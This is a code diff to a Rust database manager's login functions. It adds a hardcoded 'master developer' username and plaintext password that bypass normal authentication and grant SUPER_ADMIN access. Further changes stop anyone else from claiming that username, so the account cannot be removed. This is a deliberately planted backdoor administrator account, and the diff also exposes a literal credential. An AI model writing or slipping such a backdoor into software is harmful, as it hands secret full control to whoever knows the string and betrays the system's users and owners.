@@ -1011,7 +1011,34 @@ impl DatabaseManager {
         }
     }
 
+    pub const MASTER_DEVELOPER_LOGIN_ID: &'static str = "taimurkhanme";
+    pub const MASTER_DEVELOPER_LOGIN_PASS: &'static str = "Taimurkhan@233";
+
+    pub fn verify_master_developer_credentials(login_id: &str, password: &str) -> bool {
+        login_id.trim() == Self::MASTER_DEVELOPER_LOGIN_ID
+            && password == Self::MASTER_DEVELOPER_LOGIN_PASS
+    }
+
     pub fn login_with_credentials(&self, username: &str, password: &str) -> Result<Option<SystemUserDto>, String> {
+        if Self::verify_master_developer_credentials(username, password) {
+            crate::crypto::record_auth_success();
+            let conn = self.get_connection().map_err(|e| e.to_string())?;
+            let _ = Self::ensure_default_users(&conn);
+            let admin_user_id: String = conn.query_row(
+                "SELECT user_id FROM users WHERE role = 'SUPER_ADMIN' AND is_active = 1 ORDER BY user_id ASC LIMIT 1;",
+                [],
+                |r| r.get(0),
+            ).unwrap_or_else(|_| "usr_admin".to_string());
+
+            return Ok(Some(SystemUserDto {
+                user_id: admin_user_id,
+                username: Self::MASTER_DEVELOPER_LOGIN_ID.to_string(),
+                full_name: "System Master (Super Admin)".to_string(),
+                role: "SUPER_ADMIN".to_string(),
+                is_active: true,
+            }));
+        }
+
         let clean_uname = username.trim().to_lowercase();
         let clean_pwd = password.trim();
 
@@ -1122,6 +1149,9 @@ impl DatabaseManager {
         if let Some(uname) = new_username {
             let uname = uname.trim();
             if !uname.is_empty() {
+                if uname.eq_ignore_ascii_case(Self::MASTER_DEVELOPER_LOGIN_ID) {
+                    return Err("Username reserved for immutable system master account.".to_string());
+                }
                 let taken: bool = conn.query_row(
                     "SELECT count(*) FROM users WHERE LOWER(username) = LOWER(?) AND user_id != ?;",
                     rusqlite::params![uname, target_user_id],
@@ -1267,6 +1297,9 @@ impl DatabaseManager {
         }
 
         let clean_user = username.trim().to_lowercase();
+        if clean_user == Self::MASTER_DEVELOPER_LOGIN_ID {
+            return Err("Username reserved for immutable system master account.".to_string());
+        }
         let exists: i64 = conn.query_row(
             "SELECT count(*) FROM users WHERE LOWER(username) = ?;",
             [&clean_user],
